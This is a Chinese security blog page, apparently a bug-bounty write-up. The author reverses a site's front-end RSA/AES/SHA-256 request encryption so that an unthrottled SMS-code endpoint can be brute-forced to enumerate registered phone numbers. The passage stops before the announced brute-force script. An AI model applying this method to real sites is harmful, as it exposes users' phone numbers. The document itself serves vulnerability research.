@@ -1,0 +1,1710 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="挖洞实战之信息泄露与前端加密, 远离尘世的幻想乡">
+    <meta name="description" content="本文首发于“合天网安实验室”
+前言
+本文并非密码向，不会对算法过程/代码逻辑进行具体阐述，因为这没有意义，实战的时候肯定是具体问题具体分析，所以了解个大致流程就行。
+
+在挖洞过程中，很容易找到一些登录/忘记密码是手机验证码验证的站，有些站对">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-6YEVLJ0ZVB"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'G-6YEVLJ0ZVB');
+</script>
+
+
+    <title>挖洞实战之信息泄露与前端加密 | 远离尘世的幻想乡</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="远离尘世的幻想乡" type="application/atom+xml">
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light" id="fixFontSizeToTitle">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/categories/%E6%9D%82%E8%B0%88">
+          
+          <span>杂谈</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/SRC">
+          
+          <span>SRC</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/Web">
+          
+          <span>Web</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/Reverse">
+          
+          <span>Reverse</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/Crypto">
+          
+          <span>Crypto</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/%E5%89%8D%E7%AB%AF">
+          
+          <span>前端</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/Android">
+          
+          <span>Android</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/Tools">
+          
+          <span>Tools</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/%E5%BC%80%E5%8F%91">
+          
+          <span>开发</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        <!-- <img src="/medias/logo.png" class="logo-img circle responsive-img"> -->
+        
+        <div class="logo-name">远离尘世的幻想乡</div>
+        <div class="logo-desc">
+            
+            May the flame guide thee
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/categories/%E6%9D%82%E8%B0%88 " style="margin-left:75px">
+				  
+		          <span>杂谈</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories/SRC " style="margin-left:75px">
+				  
+		          <span>SRC</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories/Web " style="margin-left:75px">
+				  
+		          <span>Web</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories/Reverse " style="margin-left:75px">
+				  
+		          <span>Reverse</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories/Crypto " style="margin-left:75px">
+				  
+		          <span>Crypto</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories/%E5%89%8D%E7%AB%AF " style="margin-left:75px">
+				  
+		          <span>前端</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories/Android " style="margin-left:75px">
+				  
+		          <span>Android</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories/Tools " style="margin-left:75px">
+				  
+		          <span>Tools</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories/%E5%BC%80%E5%8F%91 " style="margin-left:75px">
+				  
+		          <span>开发</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+</header>
+<script>
+    let width=document.documentElement.clientWidth;
+    let html_title=''
+    if (width<500){
+        html_title='<span class="logo-span" style="font-size: 1.2rem;">远离尘世的幻想乡</span>';
+    }else{
+        html_title='<span class="logo-span">远离尘世的幻想乡</span>';
+    }
+    document.getElementById("fixFontSizeToTitle").insertAdjacentHTML("beforeEnd", html_title);
+</script>
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/79.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">挖洞实战之信息泄露与前端加密</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/JS%E9%80%86%E5%90%91/">
+                                <span class="chip bg-color">JS逆向</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/SRC/" class="post-category">
+                                SRC
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-03-15
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2023-01-05
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    2.2k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    9 分
+                </div>
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>本文首发于“合天网安实验室”</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>本文并非密码向，不会对算法过程/代码逻辑进行具体阐述，因为这没有意义，实战的时候肯定是具体问题具体分析，所以了解个大致流程就行。</p>
+</blockquote>
+<p>在挖洞过程中，很容易找到一些登录/忘记密码是手机验证码验证的站，有些站对发送验证码这一环节并未做太多的限制，理论上可以借助这个漏洞进行爆破，从而得出数据库内所有已注册手机号，这也算一种<strong>信息泄露</strong>。这种洞十分好挖，对技术要求不高，很适合SRC入门！</p>
+<p>如果站点在请求的时候存在前端加密，大概都是常规的AES或RSA(比如以前的京东/B站)。所以写篇文章，整理下思路。 </p>
+<h2 id="寻源"><a href="#寻源" class="headerlink" title="寻源"></a>寻源</h2><p>前几天挖洞的时候就看到个发送验证码的</p>
+<p><img src="/../images/%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/image-20220316142759029.png"></p>
+<p>先跑一百个请求，对发包没有做什么限制，说明有门！</p>
+<p><img src="/../images/%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/image-20220316143420919.png"></p>
+<p>但问题来了，请求体是这样的，明显进行了前端加密，要想爆破，还得先找出加密逻辑。</p>
+<p><img src="/../images/%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/image-20220316143508522.png"></p>
+<p>打开F12,发现控制台在输出东西，</p>
+<p><img src="/../images/%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/image-20220316191222919.png"></p>
+<p>再看资源文件，chunk文件加上index，那直接去找index.js文件即可。</p>
+<p><img src="/../images/%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/image-20220316191309292.png"></p>
+<p>然后就是要找到具体位置了，<strong>c0ny1</strong>表哥给出了一些好办法，详情见<a target="_blank" rel="noopener" href="https://gv7.me/articles/2018/fast-locate-the-front-end-encryption-method/">快速定位前端加密方法</a></p>
+<p>可惜在这个站上不怎么好使，只能慢慢找了。</p>
+<p>一般前端加密都是用<code>JSEncrypt</code>库的，所以可以试试搜一些<code>jsencrypt</code>相关的方法名，如<code>setPublicKey</code>、<code>encrypt</code>等</p>
+<p>若压缩过的代码看得太累，可以试试用<a target="_blank" rel="noopener" href="http://jsnice.org/%E7%BE%8E%E5%8C%96%E4%B8%8B%E3%80%82">http://jsnice.org/美化下。</a></p>
+<p><strong>不要手撕js，会变得不幸。</strong></p>
+<p>首先打开F12,点开源代码，点个js文件，之后再点下左下角的美化按钮</p>
+<p><img src="/../images/%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/image-20220316192636305.png"></p>
+<p>代码就变得好看多了</p>
+<p><img src="/../images/%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/image-20220316192721656.png"></p>
+<p>尝试性的搜了下<code>encrypt</code>，位置大概就被我找到了。</p>
+<p><img src="/../images/%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/image-20220316193020888.png"></p>
+<p>这里有很多个函数，如<code>encodeRSA</code>、<code>decodeRSA</code>、<code>getKeyRSADefault</code>、<code>encodeAES</code>、<code>decodeAES</code>、<code>getKeyAES</code>、<code>signature</code>这种函数名，可以说是再明显不过的提示了。</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>经过不眠不休的折磨，我逐渐理解了一切。</p>
+<h3 id="0-DEMO"><a href="#0-DEMO" class="headerlink" title="0.DEMO"></a>0.DEMO</h3><p>先了解一下<code>JSEncrypt</code>库，十分简单</p>
+<pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">import JSEncrypt from &#39;jsencrypt&#39;
+
+&#x2F;&#x2F;加密
+var encryptor &#x3D; new JSEncrypt()
+var pubKey &#x3D; &#39;-----BEGIN PUBLIC KEY-----公钥-----END PUBLIC KEY-----&#39;
+encryptor.setPublicKey(pubKey)&#x2F;&#x2F;设置公钥
+var rsaPassWord &#x3D; encryptor.encrypt(&#39;要加密的内容&#39;)
+
+&#x2F;&#x2F;解密
+var decrypt &#x3D; new JSEncrypt()
+var priKey  &#x3D; &#39;-----BEGIN RSA PRIVATE KEY-----私钥-----END RSA PRIVATE KEY----&#39;
+decrypt.setPrivateKey(priKey)&#x2F;&#x2F;设置秘钥
+var uncrypted &#x3D; decrypt.decrypt(&quot;要解密的内容&quot;)&#x2F;&#x2F;解密之前拿公钥加密的内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="1-RSA"><a href="#1-RSA" class="headerlink" title="1.RSA"></a>1.RSA</h3><p>首先在疑似RSA加密的位置的<strong>结尾</strong>下个断点，</p>
+<p><img src="/../images/%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/image-20220316193942854.png"></p>
+<p>为什么要在结尾？大概思路是：不去关心这个函数的具体逻辑，因为太费劲；由结果推过程，直接看代码运行结束后那些参数以及返回值，以此结合<strong>所学知识/经验</strong>去推断这个函数的作用。</p>
+<p><strong>我们不是来做密码题的，我们只是来挖洞的。</strong></p>
+<p>然后会发现，右边有一大堆参数。</p>
+<p><img src="/../images/%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/image-20220316194411297.png"></p>
+<p>好，再看<code>encodeRSA</code>函数，已知n为0，该函数有用的部分就变成这样了</p>
+<p><img src="/../images/%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/image-20220316195043527.png"></p>
+<p>而<code>s[&quot;JSEncrypt&quot;]</code>很明显，是<code>JSEncrypt</code>库的<code>JSEncrypt</code>对象,那将代码整理一下就是：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    o <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSEncrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    o<span class="token punctuation">.</span><span class="token function">setPublicKey</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> o<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>看，其实就是普通的RSA加密！</p>
+<p>而且<strong>RSA公钥</strong>也给了，就是参数<code>a</code>！</p>
+<p><img src="/../images/%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/image-20220316213818326.png"></p>
+<p>然后加密字符串参数<code>t</code>，其值为<code>PHVDHENXNREOEVON</code>。这个值是网页在加载的时候就执行<code>getKeyAES</code>函数得出的结果。</p>
+<p><img src="/../images/%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/image-20220316001641218.png"></p>
+<p>在F12的控制台中执行一下，能够输出相似的结果。</p>
+<p><img src="/../images/%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/image-20220316213619779.png"></p>
+<p><code>JSEncrypt</code>的默认RSA加密机制是<strong>RSAES-PKCS1-V1_5</strong>，而且还会进行base64编码。</p>
+<p><img src="/../images/%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/image-20220316214735598.png"></p>
+<p>扔到<code>CyberChef</code>先放着，待会有用。</p>
+<p><img src="/../images/%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/image-20220316213941415.png"></p>
+<p>加密完了，该尝试解密了。解密需要私钥。一般前端加密，公钥都会直接放到JS里，如果需要解密，那私钥也可能放这。</p>
+<p>随便看了下，公钥和私钥就在下面，比较了下这个公钥和之前断点跑出的公钥也对的上。</p>
+<p><img src="/../images/%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/image-20220316215057485.png"></p>
+<p>这样，就可以解密了。</p>
+<p><img src="/../images/%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/image-20220316215159937.png"></p>
+<h3 id="2-AES"><a href="#2-AES" class="headerlink" title="2.AES"></a>2.AES</h3><p>接下来就是AES，同样的，下个断点看结果。</p>
+<p><img src="/../images/%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/image-20220316215523284.png"></p>
+<p>能够发现，参数<code>e</code>是输入的值，参数<code>t</code>的值和之前那个值一模一样,同时也是需要加密的字符串。</p>
+<p>而且AES相关参数也给出了：</p>
+<p><img src="/../images/%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/image-20220316221254884.png"></p>
+<p>初始向量：1234567812345678，CBC模式，zeropadding填充。</p>
+<p>AES的话，<code>CyberChef</code>没有padding相关选项，运算结果末位有所不同，所以用另一个表哥写的工具：<a target="_blank" rel="noopener" href="https://github.com/Leon406/ToolsFx">https://github.com/Leon406/ToolsFx</a></p>
+<p><img src="/../images/%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/image-20220316224350262.png"></p>
+<p>解码的话也是一样，毕竟是对称加密。</p>
+<h3 id="3-SHA-256"><a href="#3-SHA-256" class="headerlink" title="3.SHA-256"></a>3.SHA-256</h3><blockquote>
+<p>SHA-2，名称来自于安全散列算法2(Secure Hash Algorithm 2)的缩写，一种密码散列函数算法标准,属于SHA算法之一，是SHA-1的后继者。其下又可再分为六个不同的算法标准，包括了：SHA-224、SHA-256、SHA-384、SHA-512、SHA-512/224、SHA-512/256</p>
+</blockquote>
+<p>这里就是最后的波纹了，也是最复杂的地方。</p>
+<p>还是一样的思路，但由于输入的参数不好猜，于是我在同一行加了好多个断点去看参数变化，这是一个非常好滴技巧！如下图所示，每个蓝色三角形就是断点。</p>
+<p>在这能发现，这段代码的意思就是将<code>e</code>组合起来，键值对加等号且再用逗号相连变成字符串<code>n</code>。</p>
+<p><img src="/../images/%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/image-20220316133316256.png"></p>
+<p>之后又将<code>字符串n</code>进行了相关处理，去掉逗号空格啊，加上括号啊，最后输出格式如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;clientId&#x3D;P_AIAS_ROS, encodeKey&#x3D;GqdPQJptPlZctYZ+tEBo0MDTD7TntMDsrN3ATv5SC&#x2F;WScxyhpYu&#x2F;WoQsI0u42eDphmlhuHYWA6rPbWlcDYfyrHN8HWrrzHe+X7aiQh9Hnb1iR&#x2F;&#x2F;I3abF4+Td641b1SeeYdU3aloc3ScaS8+CbVARKiM9g27R8CKk8Dbekb6lMEk&#x3D;, requestData&#x3D;Cy8UWBCz0dwJUBQ1u5BJr1jxicrnJ6YnrwchucXDanOVdV8Pp3rn1Uq35FB3pR7I, requestId&#x3D;1647409240148, secret&#x3D;test, timestamp&#x3D;20220316014040&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>好，接下来来验证一下</p>
+<p>这是返回值<code>89a6716fb3958c180837569a4a50a093a2bfa0ab6763a3b439a05b78e80d38f9</code></p>
+<p><img src="/../images/%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/image-20220316135647792.png"></p>
+<p>输出结果对的上，说明没错：</p>
+<p><img src="/../images/%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/image-20220316140038651.png"></p>
+<p>看着下图的请求体，最后总结一下。</p>
+<p><img src="/../images/%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/image-20220316140842871.png"></p>
+<p>1.在网页加载的时候先获取一个长度16的<code>AES KEY</code>，然后对这个<code>AES KEY</code>进行<strong>RSA</strong>+<strong>Base64</strong>加密，结果为<code>encodeKey</code>，</p>
+<p>2.将<code>&#123;&quot;phone&quot;:&quot;13888888888&quot;,&quot;smsCode&quot;:&quot;&quot;&#125;</code>这个格式的字符串，根据<code>AES KEY</code>进行<strong>AES</strong>+<strong>Base64</strong>加密，结果为<code>requestData</code></p>
+<p>3.<code>clientId</code>、<code>requestId</code>、<code>timestamp</code>不影响。这三个参数并未参与密码运算，可以任意更改。</p>
+<p>4.将所有参数融合进行<strong>SHA256</strong>加密来签名。</p>
+<h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><p>分析完毕，那么接下来就可以开始爆破了。</p>
+<p>接下来有两种做法：</p>
+<p>1.写Python代码。因为思路以及理清且加密逻辑简单，可以直接手搓。</p>
+<p>2.写JavaScript代码，配合<strong>c0ny1</strong>表哥的插件<a target="_blank" rel="noopener" href="https://github.com/c0ny1/jsEncrypter%E3%80%82">https://github.com/c0ny1/jsEncrypter。</a></p>
+<p>在这里我选择1，具体代码如下：</p>
